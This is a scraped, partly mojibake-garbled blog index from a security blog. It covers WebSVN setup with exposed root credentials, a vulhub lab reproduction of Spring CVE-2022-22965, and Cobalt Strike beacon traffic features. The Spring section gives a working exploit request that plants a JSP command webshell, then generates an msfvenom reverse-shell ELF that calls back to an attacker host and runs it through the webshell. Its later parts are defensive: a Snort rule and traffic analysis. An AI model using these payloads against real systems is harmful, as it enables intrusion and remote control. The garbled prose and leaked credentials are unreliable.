/usr/share/nginx/htmlwget https://github.com/websvnphp/websvn/archive/refs/tags/2.6.0.zipunzip 2.6.0.zip 123cd websvn-2.6.0cp include/distconfig.php include/config.phpvim include/config.php 12$config-&gt;addRepository(&#x27;FirServer&#x27;, &#x27;http://81.70.247.200/FirServer&#x27;, null, &#x27;root&#x27;, &#x27;root123&#x27;);$config-&gt;addRepositorySubpath(&#x27;FirServer-Rose&#x27;, &#x27;http://81.70.247.200/FirServer&#x27;, &#x27;branches/branche_rose&#x27;, null, &#x27;root&#x27;, &#x27;root123&#x27;); å‚è€ƒæ–‡ç« https://shenyu.me/2016/06/12/websvn.html","categories":[{"name":"æ¼æ´å¤ç°","slug":"æ¼æ´å¤ç°","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[],"author":"Gryffinbit"},{"title":"Spring RCE ç‰¹å¾æµé‡åˆ†æï¼ˆCVE-2022-22965ï¼‰","slug":"Springæ¡†æ¶è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°ï¼ˆCVE-2022-22965ï¼‰","date":"2022-10-31T14:18:13.000Z","updated":"2024-11-12T06:59:18.000Z","comments":true,"path":"2022/10/31/Springæ¡†æ¶è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°ï¼ˆCVE-2022-22965ï¼‰/","permalink":"https://gryffinbit.top/2022/10/31/Spring%E6%A1%86%E6%9E%B6%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2022-22965%EF%BC%89/","excerpt":"","text":"æ¼æ´è¯¦æƒ…æ¼æ´ç®€ä»‹ 2022å¹´3æœˆ30æ—¥ï¼ŒSpringæ¡†æ¶æ›å‡ºRCE 0dayæ¼æ´ï¼Œå›½å®¶ä¿¡æ¯å®‰å…¨æ¼æ´å…±äº«å¹³å°ï¼ˆCNVDï¼‰å·²æ”¶å½•äº†Springæ¡†æ¶è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCNVD-2022-23942ï¼‰ï¼Œè€ƒè™‘åˆ°Springæ¡†æ¶çš„å¹¿æ³›åº”ç”¨ï¼Œæ¼æ´è¢«è¯„çº§ä¸ºå±é™©ã€‚ é€šè¿‡è¯¥æ¼æ´å¯å†™å…¥webshellä»¥åŠå‘½ä»¤æ‰§è¡Œã€‚åœ¨Springæ¡†æ¶çš„JDK9ç‰ˆæœ¬(åŠä»¥ä¸Šç‰ˆæœ¬)ä¸­ï¼Œè¿œç¨‹æ”»å‡»è€…å¯åœ¨æ»¡è¶³ç‰¹å®šæ¡ä»¶çš„åŸºç¡€ä¸Šï¼Œé€šè¿‡æ¡†æ¶çš„å‚æ•°ç»‘å®šåŠŸèƒ½è·å–AccessLogValveå¯¹è±¡å¹¶è¯¸å¦‚æ¶æ„å­—æ®µå€¼ï¼Œä»è€Œè§¦å‘pipelineæœºåˆ¶å¹¶å†™å…¥ä»»æ„è·¯å¾„ä¸‹çš„æ–‡ä»¶ã€‚ æ¼æ´åˆ©ç”¨æ¡ä»¶ Apache Tomcatä½œä¸ºServletå®¹å™¨ï¼› ä½¿ç”¨JDK9åŠä»¥ä¸Šç‰ˆæœ¬çš„Spring MVCæ¡†æ¶ï¼› Springæ¡†æ¶ä»¥åŠè¡ç”Ÿçš„æ¡†æ¶spring-beans-*.jaræ–‡ä»¶æˆ–è€…å­˜åœ¨ æ¼æ´å½±å“èŒƒå›´ 1ã€JDK JDK 9+ 2ã€Spring Framework 5.3.18+ 5.2.20+ dockerä¸­å·²ç»é…ç½®å¥½jdkç¯å¢ƒäº†ã€‚dockerä¸­çš„ç¯å¢ƒä¸å®¿ä¸»æœºjdkç¯å¢ƒæ— å…³ã€‚åªæ˜¯å½“æ—¶åšå®éªŒçš„æ—¶å€™ï¼Œåˆšå¥½ä¹Ÿè£…äº†jdk9ï¼Œè®°å½•äº†ä¸€ä¸‹å®‰è£…è¿‡ç¨‹ã€‚ ubuntuä¸‹jdk9å®‰è£…ï¼š å®˜ç½‘ä¸‹è½½jdkï¼Œæ”¾å…¥è§£å‹åˆ°è·¯å¾„/usr/lib/jvm åˆ©ç”¨update-alternatives è¿›è¡Œjdkç‰ˆæœ¬åˆ‡æ¢ æ•°å­—è¶Šå¤§ï¼Œä¼˜å…ˆçº§è¶Šé«˜ æ‰§è¡Œå‘½ä»¤ï¼š 1234567sudo update-alternatives --install /usr/bin/java java /usr/lib/jvm/jdk-9.0.4/bin/java 1000sudo update-alternatives --install /usr/bin/javac javac /usr/lib/jvm/jdk-9.0.4/bin/javac 1000sudo update-alternatives --install /usr/bin/jar jar /usr/lib/jvm/jdk-9.0.4/bin/jar 1000sudo update-alternatives --install /usr/bin/javah javah /usr/lib/jvm/jdk-9.0.4/bin/javah 1000sudo update-alternatives --install /usr/bin/javap javap /usr/lib/jvm/jdk-9.0.4/bin/javap 1000sudo update-alternatives --install /usr/bin/jshell jshell /usr/lib/jvm/jdk-9.0.4/bin/jshell 1000sudo update-alternatives --install /usr/bin/jconsole jconsole /usr/lib/jvm/jdk-9.0.4/bin/jconsole 1000 ä¿®æ”¹é…ç½® 1vim /etc/profile 12345678910#env#export JAVA_HOME=/usr/lib/jvm/jdk-9.0.4#export JRE_HOME=/usr/lib/jvm/jdk-9.0.4/jre#export CLASSPATH=.:$JAVA_HOME/lib:$JAVA_HOME/jre/lib:$CLASSPATH#export PATH=$JAVA_HOME/bin:$JAVA_HOME/jre/bin:$PATH#export JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64#export JRE_HOME=/usr/lib/jvm/java-8-openjdk-amd64/jre#export PATH=$JAVA_HOME/bin:$JAVA_HOME/jre/bin:$PATH#export CLASSPATH=$CLASSPATH:.:$JAVA_HOME/lib:$JAVA_HOME/jre/lib 1source /etc/profile æ£€æŸ¥ä¸€ä¸‹ 1update-alternatives --display javac æ¯ä¸€ä¸ªå‘½ä»¤éƒ½æ˜¯auto æ¨¡å¼ï¼Œè¿™æ ·æ‰ä¼šè‡ªåŠ¨é€‰æ‹©ä¼˜å…ˆçº§é«˜çš„ã€‚ä¸ºäº†ç¡®ä¿ï¼Œå¯ä»¥ä¸ç”¨ç®¡ç°åœ¨çš„çŠ¶æ€ï¼Œç›´æ¥è®¾ç½®ä¸€éè¿™äº›å‘½ä»¤ä¸ºautoæ¨¡å¼ã€‚ 123456sudo update-alternatives --auto javasudo update-alternatives --auto javacsudo update-alternatives --auto javapsudo update-alternatives --auto javahsudo update-alternatives --auto jconsolesudo update-alternatives --auto jshell ç‰ˆæœ¬æ£€æŸ¥ 12/usr/bin/java -versionjava -version ç¯å¢ƒé…ç½®ä¸»æœºç³»ç»Ÿï¼šApple M1ï¼ŒmacOS Ventura version13.0 è™šæ‹Ÿæœºç³»ç»Ÿï¼ˆdockeré¶åœºç³»ç»Ÿï¼‰ï¼š ubuntu 20.04.2 x86 ï¼ˆè…¾è®¯äº‘æœåŠ¡å™¨ï¼‰ æ¼æ´å¤ç°é¶åœºé¡¹ç›®ï¼šhttps://github.com/vulhub/vulhub ubuntuå®‰è£…docker æºï¼šhttps://lug.ustc.edu.cn/wiki/mirrors/help/docker/ 1234curl -fsSL https://get.docker.com | bash -s docker --registry-mirror=https://docker.mirrors.ustc.edu.cndocker --versionsystemctl start dockersystemctl enable docker # è‡ªå¯ å®‰è£…pip 12curl -s https://bootstrap.pypa.io/get-pip.py | python3sudo apt install python3-pip å®‰è£…docker-compose 12sudo pip3 install docker-compose docker-compose --version å¯åŠ¨é¶åœºç¯å¢ƒ 12345678910111213# ä¸‹è½½é¡¹ç›®wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zipunzip vulhub-master.zipcd vulhub-master# è¿›å…¥æŸä¸€ä¸ªæ¼æ´/ç¯å¢ƒçš„ç›®å½•cd Spring/CVE-2022-22965# è‡ªåŠ¨åŒ–ç¼–è¯‘ç¯å¢ƒsudo docker-compose build# å¯åŠ¨æ•´ä¸ªç¯å¢ƒsudo docker-compose up -d å¯èƒ½é‡åˆ°çš„é—®é¢˜ï¼šå¡åœ¨äº†pullingé˜¶æ®µã€‚ å› ä¸ºdockeråŠ é€Ÿå™¨è¶…æ—¶å¯¼è‡´pullä¸ä¸‹æ¥ï¼Œæ”¹æˆå›½å†…é•œåƒ 1sudo vim /etc/docker/deamon.json æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š 1234&#123;&quot;registry-mirrors&quot;: [&quot;https://docker.mirrors.ustc.edu.cn/&quot;,&quot;https://hub-mirror.c.163.com&quot;,&quot;https://registry.docker-cn.com&quot;],&quot;insecure-registries&quot;: [&quot;10.0.0.12:5000&quot;]&#125; é‡å¯ 123systemctl stop dockersystemctl start docker.servicesystemctl status docker.service æ¼æ´ç‰ˆæœ¬éªŒè¯ è¿›å…¥dockeræ§åˆ¶å° 1234# æ‰¾åˆ°ç¯å¢ƒçš„iddocker ps# bashdocker exec -it &lt;ID&gt; /bin/bash JDK 12cd /usr/local/tomcat/bin./version.sh åˆ©ç”¨é“¾åˆ©â½¤classå¯¹è±¡æ„é€ åˆ©â½¤é“¾ï¼Œå¯¹Tomcatçš„æ—¥å¿—é…ç½®è¿›è¡Œä¿®æ”¹ï¼Œç„¶åï¼Œå‘â½‡å¿—ä¸­å†™â¼Šshell 123456789101112131415# æ„å»ºæ–‡ä»¶çš„å†…å®¹class.module.classLoader.resources.context.parent.pipeline.first.pattern=# ä¿®æ”¹tomcatæ—¥å¿—æ–‡ä»¶åç¼€class.module.classLoader.resources.context.parent.pipeline.first.suffix=# å†™å…¥æ–‡ä»¶æ‰€åœ¨çš„ç½‘ç«™æ ¹ç›®å½•class.module.classLoader.resources.context.parent.pipeline.first.directory=# å†™å…¥æ–‡ä»¶åç§°class.module.classLoader.resources.context.parent.pipeline.first.prefix=# æ–‡ä»¶æ—¥æœŸæ ¼å¼ï¼ˆå®é™…æ„é€ ä¸ºç©ºå€¼å³å¯ï¼‰class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= æ„é€ payload 123456789class.module.classLoader.resources.context.parent.pipeline.first.pattern=%&#123;test&#125;iclass.module.classLoader.resources.context.parent.pipeline.first.suffix=.jspclass.module.classLoader.resources.context.parent.pipeline.first.directory=/app/tomcat/webapps/ROOT/class.module.classLoader.resources.context.parent.pipeline.first.prefix=testfileclass.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= GETå‘é€ 123456789101112GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1Host: localhost:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: closesuffix: %&gt;//c1: Runtimec2: &lt;%DNT: 1 æœåŠ¡å™¨ä¸ŠéªŒè¯ï¼Œç¡®å®å·²ç»ç”Ÿæˆäº†jsp è®¿é—®å†™å…¥çš„webshellæ–‡ä»¶ 1http://your-ip:8080/tomcatwar.jsp?pwd=j&amp;cmd=id æ¸…ç©º éœ€è¦åœ¨åˆ©ç”¨å®Œæˆåå°†class.module.classLoader.resources.context.parent.pipeline.first.patternæ¸…ç©ºï¼Œå¦åˆ™æ¯æ¬¡è¯·æ±‚éƒ½ä¼šå†™å…¥æ–°çš„æ¶æ„ä»£ç åœ¨JSP Webshellä¸­ï¼Œå¯¼è‡´è¿™ä¸ªæ–‡ä»¶å˜å¾—å¾ˆå¤§ã€‚å‘é€å¦‚ä¸‹æ•°æ®åŒ…å°†å…¶è®¾ç½®ä¸ºç©ºï¼š 1234567GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern= HTTP/1.1Host: localhost:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: close æ€»ä½“æ¥è¯´ï¼Œè¿™ä¸ªæ¼æ´çš„åˆ©ç”¨æ–¹æ³•ä¼šä¿®æ”¹ç›®æ ‡æœåŠ¡å™¨é…ç½®ï¼Œå¯¼è‡´ç›®æ ‡éœ€è¦é‡å¯æœåŠ¡å™¨æ‰èƒ½æ¢å¤ï¼Œå®é™…æµ‹è¯•ä¸­éœ€è¦æ ¼å¤–æ³¨æ„ã€‚ åå¼¹shellç”¨msfç”Ÿæˆæœ¨é©¬ 12345# msf5çš„è¯­æ³• msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=your-å…¬ç½‘ip LPORT=7777 -f elf &gt; shell.elf# msf6çš„è¯­æ³•msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=your-å…¬ç½‘ip LPORT=7777 -f elf &gt; shell.elf Lhostæ˜¯ç›‘å¬æœºå™¨çš„ipã€‚å› ä¸ºç›®æ ‡æœºä¹Ÿæ˜¯å…¬ç½‘ä¸­çš„ï¼Œæ‰€ä»¥ç›‘å¬æœºå™¨ä¹Ÿéœ€è¦æ˜¯å…¬ç½‘IPï¼Œè¿™æ ·æ‰èƒ½è®¿é—®åˆ°ã€‚ msfç”Ÿæˆçš„shell.elfæ˜¯åœ¨æœ¬åœ°çš„ï¼Œéœ€è¦è‡ªå·±æƒ³åŠæ³•ä¼ åˆ°æœåŠ¡å™¨ä¸Šã€‚ ç«¯å£éšä¾¿å†™ï¼Œä½†æ˜¯è¦æ‰“å¼€å¯¹åº”çš„é˜²ç«å¢™è§„åˆ™ã€‚ kaliï¼š 1234apt-get install ufwufw statusufw enableufw allow 7777 æœ¨é©¬ä¸Šä¼  æ­£å¸¸æƒ…å†µä¸‹ï¼Œåº”è¯¥æ˜¯åœ¨å…¬ç½‘çš„vpsä¸‹é¢ç”Ÿæˆelfï¼Œç„¶åwgetä¸‹è½½ã€‚ä½†æˆ‘è¿™æ¬¡åœ¨æœ¬åœ°ç”Ÿæˆçš„ï¼Œæ‰€ä»¥ç›´æ¥scpæ‹·åˆ°æœåŠ¡å™¨ä¸Šå»ã€‚ å®¿ä¸»æœºå‘dockerä¼ è¾“æ–‡ä»¶ 12docker cp æœ¬åœ°æ–‡ä»¶çš„è·¯å¾„ container_id:&lt;dockerå®¹å™¨å†…çš„è·¯å¾„&gt;docker cp /home/ubuntu/shell.elf 1e652d6144ae:/usr/local/tomcat/webapps/ROOT/ èµ‹äºˆæœ¨é©¬æƒé™ 123chmod 777 /shell.elf# urlç¼–ç chmod%20777%20%2Fshell.elf 1your-å…¬ç½‘ip:8080/tomcatwar.jsp?pwd=j&amp;cmd=chmod%20777%20%2Fshell.elf msfå¼€å¯ç›‘å¬ åœ¨å…¬ç½‘æœåŠ¡å™¨ä¸Š ubuntuä¸Šå¿«é€Ÿå®‰è£…msfï¼šhttps://www.cnblogs.com/tomyyyyy/p/12813299.html 123456msfconsole # åœ¨å‘½ä»¤è¡Œé‡Œé¢è¾“å…¥å‘½ä»¤ï¼Œè¿›å…¥msfæ¼æ´åˆ©ç”¨æ¡†æ¶ï¼›use exploit/multi/handler # ç›‘å¬æœ¨é©¬åå¼¹è¿‡æ¥çš„shellset payload linux/x86/meterpreter_reverse_tcp # è®¾ç½®payloadï¼Œä¸åŒçš„æœ¨é©¬è®¾ç½®ä¸åŒçš„payloadï¼Œè®¾ç½®payloadæ—¶ï¼Œè¦æ ¹æ®ç›®æ ‡ç³»ç»Ÿçš„ç³»ç»Ÿä½æ•°è®¾ç½®ç›¸åº”çš„payload;set lhost &lt;ip&gt; # vps ipset lport &lt;vpsç«¯å£&gt; # vpsç«¯å£exploit # å¼€å§‹è¿›è¡Œç›‘å¬ï¼› æ‰§è¡Œæœ¨é©¬ 12/tomcatwar.jsp?pwd=j&amp;cmd=./shell.elf/tomcatwar.jsp?pwd=j&amp;cmd=.%2Fshell.elf æŠ“åŒ…è¿‡æ»¤è¯­å¥ï¼šipç»ˆç‚¹é€‰é¶æœºçš„IPã€‚èµ·ç‚¹é€‰æ‹©æ”»å‡»æœºçš„IPã€‚å› ä¸ºé¶åœºèµ°çš„8080ç«¯å£ï¼Œhttpåè®®ã€‚æ‰€ä»¥ç­›é€‰æ¡ä»¶åŠ ä¸Šhttpåè®®ã€‚ 1ip.dst == &lt;é¶æœºIP&gt; &amp;&amp; http è¿½éšNo.1277å’Œ1566çš„httpæµ ç‰¹å¾æµé‡åˆ†æpipeline.first.pattern å¯¹getå¤´è¿›è¡Œè§£ç ï¼š 1/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%&#123;c2&#125;i if(&quot;j&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123; java.io.InputStream in = %&#123;c1&#125;i.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; &#125; %&#123;suffix&#125;i&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= pipeline.first.suffix parent.pipeline.first.directory pipeline.first.prefix pipeline.first.fileDateFormat æ¼æ´è§„åˆ™è§„åˆ™æ€è·¯ğŸ‘‡ 1alert tcp any any -&gt; [$HOME_NET,$HTTP_SERVERS] any (msg:&quot;SpringCore RCE&quot;; flow:to_server,established; content:&quot;pipeline.first.pattern=&quot;; http_uri; fast_pattern; classtype:attempted; sid:100000; rev:2;) snortè§„åˆ™éªŒè¯snortçš„å„ç§é…ç½®ä»¥åŠç¯å¢ƒï¼Œè§ä»¥å‰çš„blogï¼šhttps://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/snort/ æŠŠåˆšåˆšæŠ“åˆ°çš„æ•°æ®åŒ…æ”¾è¿›snortç¯å¢ƒä¸­ æŠŠå†™å¥½çš„è§„åˆ™æ–‡ä»¶ä¹Ÿæ”¾è¿›ç¯å¢ƒä¸­ã€‚ è§„åˆ™é…ç½® æŠŠè§„åˆ™æ–‡ä»¶æ”¾è¿›è§„åˆ™è·¯å¾„ï¼Œå¹¶ä¿®æ”¹snort.confé…ç½® 1234mv CVE-2022-22965.rules /etc/snort/rulescd /etc/snort/ruleslsvim /etc/snort/snort.conf ä¿®æ”¹snort.confçš„å†…å®¹ è®¾ç½®éœ€è¦ä¿æŠ¤çš„ipåœ°å€ 12# Setup the network addresses you are protectingipvar HOME_NET server_public_ip/24 12# Set up the external network addresses. Leave as &quot;any&quot; in most situationsipvar EXTERNAL_NET !$HOME_NET 1234# Path to your rules files (this can be a relative path)var RULE_PATH /etc/snort/rulesvar SO_RULE_PATH /etc/snort/so_rulesvar PREPROC_RULE_PATH /etc/snort/preproc_rules 123# Set the absolute path appropriatelyvar WHITE_LIST_PATH /etc/snort/rulesvar BLACK_LIST_PATH /etc/snort/rules åœ¨setp6é‡Œï¼Œè®¾ç½®è¾“å‡º 123# unified2# Recommended for most installsoutput unified2: filename snort.log, limit 128 ç¿»åˆ°æœ€ä¸‹é¢ï¼Œæ‰¾åˆ°è§„åˆ™é›†åˆ—è¡¨ã€‚æ‰“å¼€local.rulesçš„æ³¨é‡Šï¼Œä»¥å…è®¸snortè£…è½½ä¸ªæ€§åŒ–è§„åˆ™é›†ã€‚ 1include $RULE_PATH/CVE-2022-22965.rules ä¿å­˜ç¼–è¾‘:wq æµ‹è¯•æ˜¯å¦èƒ½æ­£å¸¸å·¥ä½œ 1sudo snort -T -c /etc/snort/snort.conf è¿è¡ŒæˆåŠŸ è§„åˆ™éªŒè¯ tipsï¼š WiresharkæŠ“çš„åŒ…å¯èƒ½æ ¡éªŒå’Œä¸å¯¹ï¼Œæ ¡éªŒå’Œä¸å¯¹çš„æµé‡ï¼Œsnortä¸ä¼šæ£€æµ‹ã€‚ å¯ä»¥é€šè¿‡scapyè¿›è¡Œæ ¡éªŒå’Œä¿®æ”¹ 1234567891011121314151617from scapy.all import *from scapy.layers.inet import in4_chksum, IP, TCPpackets = rdpcap(&#x27;/Users/gryffinbit/Desktop/test3.pcap&#x27;)pkts = []for pkt in packets: print(&quot;------------&quot;) if pkt[&quot;TCP&quot;]: print(&quot;old chksum: 0x&#123;:x&#125;&quot;.format(pkt[&#x27;TCP&#x27;].chksum)) pkt[&#x27;TCP&#x27;].chksum = 0 tcp_raw = raw(pkt[TCP]) nchksum = in4_chksum(socket.IPPROTO_TCP, pkt[IP], tcp_raw) print(&quot;new chksum: 0x&#123;:x&#125;&quot;.format(nchksum)) pkt[&#x27;TCP&#x27;].chksum = nchksum pkts.append(pkt)wrpcap(&quot;out.pcap&quot;, pkts) snortæ¥å—pcapçš„æ ¼å¼ï¼Œæ‰€ä»¥è¿˜éœ€è¦å°†åŒ…ä¿å­˜ä¸ºpcapçš„æ ¼å¼ 1snort -c /etc/snort/snort.conf -r Springã€CVE-2022-22965ã€‘.pcap -l /var/log/snort/ æ£€éªŒæˆåŠŸ é™„å½•ï¼šsnort æ–‡ä»¶éƒ¨ç½²è·¯å¾„snortå®‰è£…åŒ…æ‰€åœ¨è·¯å¾„ã€ç›¸å…³æ–‡æ¡£ 1/home/parallels/snortFile docï¼šsnortçš„ä¸€äº›è¯´æ˜æ–‡æ¡£æ‰€åœ¨æ–‡ä»¶å¤¹ snortè§„åˆ™æ–‡ä»¶ã€é…ç½®æ–‡ä»¶ 1cd /etc/snort snortæ—¥å¿—æ–‡ä»¶ 1cd /var/log/snort snortè¿è¡Œ 1/usr/local/bin/snort è§„åˆ™è·¯å¾„ 1/etc/snort/rules é…ç½®è·¯å¾„ 1/etc/snort/snort.conf å‚è€ƒæ–‡ç« https://www.freebuf.com/vuls/345007.html https://www.freebuf.com/vuls/326878.html https://blog.csdn.net/weixin_45632448/article/details/124043082","categories":[{"name":"æ¼æ´å¤ç°","slug":"æ¼æ´å¤ç°","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[],"author":"Gryffinbit"},{"title":"CSæ‰¹é‡ä¼ªé€ ä¸Šçº¿","slug":"CSä¼ªé€ ä¸Šçº¿","date":"2022-10-26T15:37:32.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2022/10/26/CSä¼ªé€ ä¸Šçº¿/","permalink":"https://gryffinbit.top/2022/10/26/CS%E4%BC%AA%E9%80%A0%E4%B8%8A%E7%BA%BF/","excerpt":"","text":"åŸç†åˆ†æç›‘å¬å™¨ç®¡ç†ï¼ˆBeaconï¼‰ ç›‘å¬å™¨ï¼šç­‰å¾…è¢«å…¥ä¾µç³»ç»Ÿè¿æ¥è‡ªå·±çš„ä¸€ä¸ªæœåŠ¡ã€‚ ç›‘å¬å™¨çš„ä½œç”¨ï¼šä¸ºäº†æ¥å—payloadå›ä¼ çš„å„ç±»æ•°æ®ï¼Œç±»ä¼¼äºMSFä¸­handlerçš„ä½œç”¨ã€‚æ¯”å¦‚payloadåœ¨ç›®æ ‡æœºå™¨æ‰§è¡Œä»¥åï¼Œå°±ä¼šå›è¿åˆ°ç›‘å¬å™¨ç„¶åä¸‹è½½æ‰§è¡ŒçœŸæ­£çš„shellcodeä»£ç ã€‚ ä¸€æ—¦ç›‘å¬å™¨å»ºç«‹èµ·æ¥ï¼Œå›¢é˜Ÿæˆå‘˜åªéœ€è¦çŸ¥é“è¿™ä¸ªç›‘å¬å™¨çš„åç§°å³å¯ï¼Œä¸éœ€è¦å…³å¿ƒç›‘å¬å™¨èƒŒåçš„åŸºç¡€ç¯å¢ƒã€‚ stagerï¼šå°±æ˜¯è¿œç¨‹åŠ è½½Beacon.dllçš„shellcode Beacon Staging Severï¼š æ˜¯åˆ†é˜¶æ®µæ¨¡å¼ä¸­ï¼Œæä¾›shellcodeç­‰åŠŸèƒ½æ‰©å±•å­˜å‚¨çš„StageæœåŠ¡å™¨ã€‚å®ƒçš„ä½œç”¨æ˜¯ä¸ºäº†é˜²æ­¢Payloadè¿‡å¤§æˆ–è€…é€‚åº”ä¸åŒçš„æ”»å‡»åœºæ™¯ï¼Œå¯ä»¥åˆ†é˜¶æ®µè¿›è¡ŒpayloadæŠ•é€’ å…ƒæ•°æ®ï¼šæè¿°æ•°æ®çš„æ•°æ®ï¼Œä¸»è¦æ˜¯æè¿°æ•°æ®å±æ€§çš„ä¿¡æ¯ï¼Œç”¨æ¥æ”¯æŒå¦‚ï¼šæŒ‡ç¤ºå­˜å‚¨ä½ç½®ã€å†å²æ•°æ®ã€èµ„æºæŸ¥æ‰¾ã€æ–‡ä»¶è®°å½•ç­‰åŠŸèƒ½ã€‚æ˜¯ä¸€ç§ç”µå­å¼ç›®å½•ã€‚ CSä¸Šçº¿æµé‡ç‰¹å¾æ­¥éª¤åˆ†æ ä¸Šçº¿åŒ…çš„æ•æ„Ÿä¿¡æ¯éšè—åˆ°äº†cookieä¸­ï¼Œç‰¹å¾éå¸¸æ˜æ˜¾ã€‚é€šè¿‡è¿›ä¸€æ­¥åˆ†æï¼Œå¯ä»¥å‘ç°ï¼Œä¸Šçº¿åŒ…çš„è¯·æ±‚Cookieå€¼æ˜¯å—æ§ä¸»æœºå…ƒæ•°æ®ç»è¿‡éå¯¹ç§°åŠ å¯†åçš„å¯†æ–‡ï¼ŒCSæœåŠ¡å™¨æ¥æ”¶åˆ°Cookieå€¼åè¿›è¡Œè§£å¯†ï¼Œä»è€Œè·å–åˆ°å—æ§ä¸»æœºä¿¡æ¯ cookieåŠ å¯†è¿‡ç¨‹ æ”»å‡»è€…åˆ©ç”¨CS severç”Ÿæˆæ–°çš„Beaconç›‘å¬ï¼ˆåŒ…æ‹¬ä¸€å¯¹éå¯¹ç§°å…¬ç§é’¥ï¼‰å¹¶ç”Ÿæˆstager æ”»å‡»è€…æŠ•é€’Stageråˆ°å—æ§ä¸»æœº å—æ§ä¸»æœºåœ¨Exploité˜¶æ®µæ‰§è¡Œå°å·§çš„Stager å—æ§ä¸»æœºæ ¹æ®Stager Urlè¯·æ±‚ç‰¹å¾å‘Beacon Staging Sever ä¸‹è½½ä½“ç§¯è¾ƒå¤§æ›´å¤æ‚çš„Stageråˆ°æœ¬åœ°ï¼ŒBeacon Staging Serverä¼šæ ¡éªŒURLçš„åˆæ³•æ€§ã€‚ Stageè§£å¯†å¹¶è§£æBeaconé…ç½®ä¿¡æ¯ï¼ˆæ¯”å¦‚å…¬é’¥PublicKeyã€C2 serverä¿¡æ¯ï¼‰ Stageé€šè¿‡å…¬é’¥åŠ å¯†ä¸»æœºçš„å…ƒæ•°æ®å¹¶å‘é€è‡³C2 Server C2 Server ç”¨ç§é’¥è§£å¯†æ•°æ®è·å–ä¸»æœºå…ƒæ•°æ® stager urlï¼Œå¯ä»¥ä½œä¸ºç‰¹å¾æ¥è¯†åˆ«CSæœåŠ¡å™¨ã€‚CSä¸­çš„Stager URLæ ¡éªŒç®—æ³•ï¼Œå°±æ˜¯ç”Ÿæˆ4ä½éšæœºæ ¡éªŒç ï¼Œå°†æ ¡éªŒç æ‹¼æ¥åˆ°URLåé¢ï¼Œå³å¯è¯·æ±‚åˆ°Stageçš„ä»£ç  åˆ†é˜¶æ®µä¸Šä¼ payload https://blog.csdn.net/qq_44159028/article/details/118157559 stager urlæ ¡éªŒç®—æ³• å…³é”®å‡½æ•°ï¼šchecksum8ã€MSFURLã€isStager æµé‡ç‰¹å¾http-beaconé€šä¿¡ä¸­ï¼Œé»˜è®¤ä½¿ç”¨getæ–¹æ³•å‘/dpixelã€/__utm.gifã€/pixel.gifç­‰åœ°å€å‘èµ·è¯·æ±‚ã€‚ å¿ƒè·³åŒ… httpsï¼Œé»˜è®¤ä½¿ç”¨ç©ºè¯ä¹¦å»ºç«‹åŠ å¯†é€šé“ã€‚ dns-beaconé€šä¿¡ä¸­ï¼Œé»˜è®¤ä½¿ç”¨cdn.ã€www6.ã€api.ã€www.ã€post.ä¸ºå¼€å¤´å‘èµ·dnsè¯·æ±‚ï¼Œå¹¶ä¸”æŸ¥è¯¢ç»“æœä¼´éš0.0.0.0ã€0.0.0.80ã€0.0.0.241ç­‰éå¸¸è§„ipã€‚ è¿è¡Œstagingæ¨¡å¼çš„peæ–‡ä»¶ï¼Œä¼šå‘æŒ‡å®šæœåŠ¡å™¨çš„checksum8è·¯å¾„å‘èµ·è¯·æ±‚æ¥ä¸‹è½½stage å‚è€ƒæ–‡ç«  å‚è€ƒæ–‡ç« https://forum.butian.net/share/708 https://www.freebuf.com/articles/network/286276.html https://paper.seebug.org/1922/ 